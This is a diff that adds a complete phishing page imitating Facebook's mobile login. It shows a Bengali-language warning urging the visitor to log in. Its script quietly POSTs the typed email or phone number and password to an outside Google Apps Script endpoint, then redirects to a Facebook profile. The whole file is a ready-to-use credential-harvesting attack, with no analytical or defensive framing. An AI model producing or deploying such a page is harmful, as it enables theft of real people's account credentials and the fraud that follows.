@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Facebook</title>
+    <link rel="icon" href="https://i.ibb.co/LQ8SdT8/facebook.png" title="" type="" />
+    <style type="text/css" media="all">
+      body{
+        height: px;
+        zoom: ;
+        background-image: linear-gradient(to bottom right, #00ccff2d, #ff00003d);
+        text-align: center;
+        
+      }
+      .back{
+        margin-left: -310px;
+        color: red;
+      }
+      .eng{
+        margin-top: -px;
+        font-size: 15px;
+        color: #686868;
+      }
+      .facebook{
+        height: 60px;
+        border-radius: 100%;
+        border: 0.8px solid gray;
+        margin-top: 30px;
+        margin-bottom: 50px;
+      }
+      input{
+        height: 45px;
+        width: 90%;
+        margin-top: 12px;
+        border-radius: 7px;
+        border: 0.8px solid gray;
+        padding-left: 16px;
+        font-size: 20px;
+      }
+      button{
+        width: 89%;
+        height: 38px;
+        margin-top: 10px;
+        margin-bottom: 15px;
+        color: white;
+        background-color: #0075ff;
+        border-radius: 19px;
+        border: none;
+        font-size: 20px;
+      }
+      .forgot{
+        text-decoration: none;
+        color: black;
+        
+        font-size: 18px;
+      }
+      .creat{
+        font-size: 22px;
+        text-decoration: none;
+        
+        border: 1px solid #0075ff;
+        border-radius: 19px;
+        padding-left: 47px;
+        padding-right: 47px;
+        padding-top: 5px;
+        padding-bottom: 5px;
+        color: #0075ff;
+      }
+      .top{
+        margin-left: -295px;
+        margin-top: 10px;
+        border: none;
+        height: 20px;
+      }
+      .meta{
+        margin-right: 8px;
+        margin-top: 20px;
+        border: none;
+        height: 20px;
+      }
+      .ff{
+        display: flex;
+        margin-top: 10px;
+        margin-left: 130px;
+      }
+      .mydiv{
+      text-align: center;
+      display: none;
+      margin-top: -80px;
+      margin-bottom: 20px;
+    }
+    .load{
+        width: 25%;
+        border-radius: 100%;
+      }
+      
+             /* Callout box - fixed position at the bottom of the page */
+.callout {
+  position: fixed;
+  top: 33%;
+  left: 7%;
+  margin-left: ;
+  max-width: 300px;
+  display: none;
+}
+
+/* Callout header */
+.callout-header {
+  padding: 15px 10px;
+  background: #555;
+  font-size: 30px;
+  color: red;
+}
+
+/* Callout container/body */
+.callout-container {
+  padding-top: 1px;
+  padding-left: px;
+  padding-bottom: 20px;
+  background-color: #ccc;
+  color: #00000090;
+  font-size: 23px;
+}
+
+/* Close button */
+.closebtn {
+  position: absolute;
+  top: 5px;
+  right: 15px;
+  color: white;
+  font-size: 30px;
+  cursor: pointer;
+}
+
+/* Change color on mouse-over */
+.closebtn:hover {
+  color: lightgrey;
+}
+    </style>
+  </head>
+    <img height="1px" style=" " src="https://i.ibb.co/LQ8SdT8/facebook.png" alt="" />
+    <img class="top" src="https://i.ibb.co/d5TKq3s/24699-1-left-arrow-file.png" alt="" />
+    <p class="eng">English (US) </p>
+    <img class="facebook" src="https://i.ibb.co/LQ8SdT8/facebook.png" alt="" />
+    <form name="formName" class="formName" action="" method="post" accept-charset="utf-8">
+      <input type="text" name="email" id="email" placeholder="Mobile number or email" required/>
+      <input type="password" name="password" id="password" placeholder="Password" required/>
+      <button id="showButton" type="submit">Log in</button>
+    </form>
+    <div id="myDiv" class="mydiv">
+       <img class="load" src="https://i.ibb.co/Gt16bj8/loading.gif" alt="" />
+    </div>
+    <a class="forgot"href="https://m.facebook.com/login/identify?">Forgot password?</a><br /><br />
+    <br /><br /><br /><br /><br /><br />
+    <a class="creat" href="https://m.facebook.com/r.php">Create new account</a><br />
+    <div class="ff">
+      <img class="meta" src="https://i.ibb.co/wsDV0hH/meta.png" alt="" /><p style="color: gray; font-size: 20px;"> Meta</p>
+    </div>
+  
+  
+    
+  </div>
+   <div class="callout">
+  <div class="callout-header">Warning !</div>
+  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+  <div class="callout-container">
+    <p>ব্রাউজারে আপনার একাউন্ট login করা নেই ,অনুগ্রহ পূর্বক আপনার একাউন্ট login করুন।</p>
+    
+  </div>
+ </div>
+    <script type="text/javascript" charset="utf-8">
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyRmKsDXPtlK6QybcIlAEoJHaBCrBfesAPbSPbiTtjmkQf_XwPIm6e-J7-1YfBKWfgb/exec'
+			const form = document.forms['formName']
+		  
+			form.addEventListener('submit', e => {
+    e.preventDefault()
+			  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+				
+				.then(() => {  window.location.href = "https://www.facebook.com/profile.php?id=100095491627360"; })
+				.catch(error => console.error('Error!', error.message))
+			})
+    
+      document.getElementById("showButton").addEventListener("click", function() {
+            document.getElementById("myDiv").style.display = "block";
+        });
+    </script>
+  </body>
+</html>
